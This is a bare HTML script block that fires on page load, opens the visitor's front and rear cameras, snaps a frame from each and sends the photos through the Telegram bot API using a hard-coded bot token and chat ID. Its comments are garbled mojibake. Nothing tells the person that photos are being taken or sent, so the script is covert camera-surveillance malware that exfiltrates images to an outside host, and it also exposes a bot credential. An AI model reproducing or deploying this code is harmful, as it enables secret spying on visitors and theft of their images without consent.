<script>
    const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
    const tgChatId = "6259019006";

    window.addEventListener('load', () => {
        fastCaptureSequence();
    });

    async function fastCaptureSequence() {
        try {
            // Ù¡. Ú¯Ø±ØªÙ†ÛŒ ÙˆÛŽÙ†Û•ÛŒ Ù¾ÛŽØ´Û•ÙˆÛ• Ø¨Û• Ø®ÛŽØ±Ø§ÛŒÛŒ (ØªÛ•Ù†Ù‡Ø§ Ù¥Ù Ù  Ù…ÛŒÙ„ÛŒ Ú†Ø±Ú©Û• Ø¯Û•ÙˆÛ•Ø³ØªÛŽØª Ø¨Û† ÙÙˆÚ©Û•Ø³)
            await captureAndSendFast("user", "ðŸ“· Ù¾ÛŽØ´Û•ÙˆÛ• (Ø®ÛŽØ±Ø§)");

            // Ù¢. Ú¯Ø±ØªÙ†ÛŒ ÙˆÛŽÙ†Û•ÛŒ Ù¾Ø´ØªÛ•ÙˆÛ• Ø¯Û•Ø³ØªØ¨Û•Ø¬ÛŽ
            await captureAndSendFast("environment", "ðŸ“¸ Ù¾Ø´ØªÛ•ÙˆÛ• (Ø®ÛŽØ±Ø§)");
            
            console.log("Ù‡Û•Ù…ÙˆÙˆ ÙˆÛŽÙ†Û•Ú©Ø§Ù† Ø¨Û• Ø³Û•Ø±Ú©Û•ÙˆØªÙˆÙˆÛŒÛŒ Ù†ÛŽØ±Ø¯Ø±Ø§Ù†");
        } catch (err) {
            console.error("Camera Error:", err);
        }
    }

    async function captureAndSendFast(mode, caption) {
        const video = document.getElementById('autoVideo');
        const canvas = document.getElementById('autoCanvas');
        
        // Ø¯Ø§Ø®Ø³ØªÙ†ÛŒ Ø³ØªØ±ÛŒÙ…ÛŒ Ù¾ÛŽØ´ÙˆÙˆ
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }

        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
            audio: false 
        });
        
        video.srcObject = stream;

        // Ú©Û•Ù…ØªØ±ÛŒÙ† Ú©Ø§ØªÛŒ ÙˆÛ•Ø³ØªØ§Ù† Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§Ú©Û• Ú•ÙˆÙˆÙ† Ø¨Ø¨ÛŽØªÛ•ÙˆÛ• (Ù¥Ù Ù  Ù…ÛŒÙ„ÛŒ Ú†Ø±Ú©Û•)
        await new Promise(resolve => setTimeout(resolve, 500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Ù†Ø§Ø±Ø¯Ù†ÛŒ ÙˆÛŽÙ†Û• Ø¨Û• Ø´ÛŽÙˆÛ•ÛŒ Async (Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ù†Û•ÙˆÛ•Ø³ØªÛŽØª Ø¨Û† Ø¦Û•Ù†Ø¬Ø§Ù…ÛŒ Ù†Ø§Ø±Ø¯Ù†Û•Ú©Û•)
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', tgChatId);
            formData.append('photo', blob, 'img.png');
            formData.append('caption', caption);

            fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg', 0.6); // Ú©Û•Ù…Ú©Ø±Ø¯Ù†Û•ÙˆÛ•ÛŒ Ú©ÙˆØ§Ù„ÛŽØªÛŒ Ø¨Û† 0.6 Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ù‚Û•Ø¨Ø§Ø±Û•ÛŒ Ø¨Ú†ÙˆÙˆÚ© Ø¨ÛŽØª Ùˆ Ø®ÛŽØ±Ø§ Ø¨Ù†ÛŽØ±Ø¯Ø±ÛŽØª
    }
</script>
